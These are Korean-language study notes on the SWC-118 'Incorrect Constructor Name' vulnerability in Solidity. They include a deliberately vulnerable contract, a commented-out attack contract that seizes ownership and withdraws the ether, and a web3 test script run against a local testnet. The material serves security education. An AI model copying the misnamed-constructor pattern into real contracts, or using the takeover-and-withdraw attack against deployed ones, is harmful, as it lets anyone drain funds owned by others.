# *SWC118*

> Incorrect Constructor Name

- 생성자를 잘 못 생성했을 때 발생하는 취약점

생성자는 한 번만 호출이 되기 때문에 소유자가 변경되지 않음

- 함수로 선언될 경우, `owner`의 값이 변경되어 컨트랙트의 소유주가 계속 다른 계약 주소로 변경될 수 있음

### *Modifier*

- 함수 변경자로, 해당 기능을 통해서 함수의 동작을 변경할 수 있으며, 함수 실행 전에 조건을 확인할 수 있습니다.
- 마지막에 작성되는 `_;(Underscore)`구문은 함수를 실행하는 시점을 나타냄
    - `_;`를 를 기준으로, 해당 구문 전까지는 함수가 실행되지 않은 상태로, 설정한 조건을 만족한 뒤에 함수가 호출되도록 함
- 기본 구조

```jsx
...
modifier function{
	require(~~~~);
	_;
}
```

### *Constructor*

- 컨트랙트 생성 시, 실행되는

---

## *swc115 - Vulnerability Code*

- 취약한 컨트랙트 swc118을 생성, 컨트랙트의 함수지정자(modifier)를 사용해서 contract의 owner를 설정
- `constructor`를 사용하는 것이 아닌, 일반 함수를 사용해서 생성자를 선언
- 생성자가 컨트랙트명과 일치하지 않아 취약점이 발생함

- 생성자를 선언하고, `msg.sender==owner`일 경우, 함수를 호출할 수 있도록 함
- `constructor`를 선언하면, 컨트랙트의 생성자가 지정되며, 첫번째 계약주소로 고정된다.
    - owner는 첫번째 계약주소로 고정되고, 다른 주소로 변경할 수 없음
- `owner`를 함수를 통해서 설정하는 경우, 함수를 호출할 때 마다 계약 주소 및 컨트랙트 소유주가 변경됨
    - 컨트랙트의 이더 값을 함수를 호출한 사람은 누구나 가져갈 수 있게됨

> swc118.sol

*`function swc118()`*

- 컨트랙트의 소유주(owner)를 설정
- 컨트랙트명과 함수의 이름이 동일한 경우 생성자로 인식함

    → `_swc118.methods.swc118 is not a function` : 테스트 코드로 owner를 변경하고자 했을 때 이와 같이 함수가 아니라는 에러가 발생함

    - 0.4.24 이하 버전에서는 `contract name = function [contract name]`으로 생성자를 선언
        - 컨트랙트명과 함수명이 동일하지 않는 경우, 일반 호출 함수가 되기 때문에 소유주`(owner)`는 언제든지 변경될 수 있어 취약함
    - 0.4.24 이상 버전부터는 `constructor`를 사용하여 생성자를 선언

        → 컨트랙트가 배포되면, 계약 주소로 owner가 설정됨 (테스트 넷에서는 첫번째 계약주소가 owner가 됨)

*`function a()`*

- 컨트랙트에 이더 값을 전송하기 위한 함수

*`function withdraw()`*

- 컨트랙트에 있는 이더 값을 출금하기 위한 함수
- `onlyowner`로 설정되어 있어서, `owner`이외에는 해당 함수를 호출할 수 없으며, `modifier(함수 지정자)`를 통해서 `msg.sender와 owner`가 같은지 비교하여, 같은 경우 `withdraw`함수를 호출하도록 함

```jsx
// SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;

contract swc118{
  address private owner;
  event a_payable(address msg_sender, address _owner, uint256 value);
  event _withdraw(address msg_sender, address _owner, uint256 value);
  event setowner_event(address owner, address msg_sender);

  //함수지정자
  // _;는 함수를 실행하기 전에 행동을 제한하는 것에 사용
  modifier onlyowner{
    require(msg.sender==owner,
    "only owner call this");
    _; //require 행동을 완료하고, 함수를 실행시킨다는 의미
  }

  //생성자, 일반 함수로 호출, 생성자 및 owner는 계속 변경됨
  //호출당하면 owner의 값이 변경됨 msg.sender == owner
  //컨트랙트명과 동일한 이름으로 함수를 생성 = 생성자를 생성
  //0.4.24 이상 버전부터는 constructor를 사용
  //컨트랙트명과 함수의 이름이 동일하지 않는 경우, 일반 호출 함수로 변경됨
  function swc118() public{
    owner = msg.sender;
    emit setowner_event(owner, msg.sender);
  } 

  /*function Swc118() public{
    owner = msg.sender;
    emit setowner_event(owner, msg.sender);
  } */

  //생성자 fixed
  /*constructor()
        public
    {
        owner = msg.sender;
    }*/

  function a() payable{
    emit a_payable(msg.sender, owner, msg.value);
  }

  //onlyowner만 호출할 수 있음
  function withdraw() public onlyowner{
    require(msg.sender==owner,
    "msg.sender is not owner");
    emit _withdraw(msg.sender, owner, this.balance);
    owner.transfer(this.balance);
  }
}

/*contract attack{
  address attacker;
  swc118 swc118_contract;

  //컨트랙트 및 공격자의 주소를 설정 
  function setaddr(swc118 _swc118_contract, address attack_address) {
    swc118_contract = _swc118_contract;
    attacker = attack_address;
  }

  //Swc118 함수를 호출해서 owner를 재설정
  function attack_swc118() {
    swc118_contract.Swc118();
  }

  function attack_withdraw(){
    swc118_contract.withdraw();
  }

}*/
```

- test.js

```jsx
const Web3 = require('web3');
const web3 = new Web3(new Web3.providers.HttpProvider("http://127.0.0.1:9545"));
const swc118_json = require("../build/contracts/swc118.json")
const attack_json = require("../build/contracts/attack.json")
const swc118_abi = swc118_json['abi'];
const attack_abi = attack_json['abi'];
const _swc118 = new web3.eth.Contract(swc118_abi, "0x9E5192F1828f71213b70f01D76b4cf47BE5B3C61");
const _attack = new web3.eth.Contract(attack_abi, "0x9E5192F1828f71213b70f01D76b4cf47BE5B3C61");

// account[0] = 희생자 주소
// account[1] = 예비용 주소
// account[2] = 공격자 주소
async function swc118(){
    const account0 = (await web3.eth.getAccounts())[0];
    const account1 = (await web3.eth.getAccounts())[1];
    const account2 = (await web3.eth.getAccounts())[2];

    await _swc118.methods.swc118().send({from:account1,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
}

async function swc118_withdraw(){
    const account0 = (await web3.eth.getAccounts())[0];
    const account1 = (await web3.eth.getAccounts())[1];
    const account2 = (await web3.eth.getAccounts())[2];
    //swc118 컨트랙트의 이더 값을 전부 출금
    await _swc118.methods.withdraw().send({from:account0,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
}

async function attack_addrset(){
    const account0 = (await web3.eth.getAccounts())[0];
    const account1 = (await web3.eth.getAccounts())[1];
    const account2 = (await web3.eth.getAccounts())[2];
    
    await _attack.methods.setaddr("0xd09C033BDD48729df7fD4f9A28D8d7a106C15e81","0x093A0224259989B389d56dF889d19Cb70b4F37f2").send({from:account2,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )

    await _attack.methods.attack_swc118().send({from:account2,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
}

async function attack_swc118(){
    const account0 = (await web3.eth.getAccounts())[0];
    const account1 = (await web3.eth.getAccounts())[1];
    const account2 = (await web3.eth.getAccounts())[2];

    await _attack.methods.attack_withdraw().send({from:account2,gas:100000,gasPrice:'100000'}).then(
        function(result){
            console.log(result);
        }
    )
}

async function swc118_sendether(){
    const account9 = (await web3.eth.getAccounts())[9];
    await _swc118.methods.a().send({from:account9,gas:100000,gasPrice:'100000',value:web3.utils.toWei("0.1","ether")}).then(
        function(result){
            console.log(result);
        }
    )
}
//swc118();
swc118_withdraw();
//attack_addrset();
//attack_swc118();
swc118_sendether(); //account9에서 알아서 0.1씩 계속 입금
```
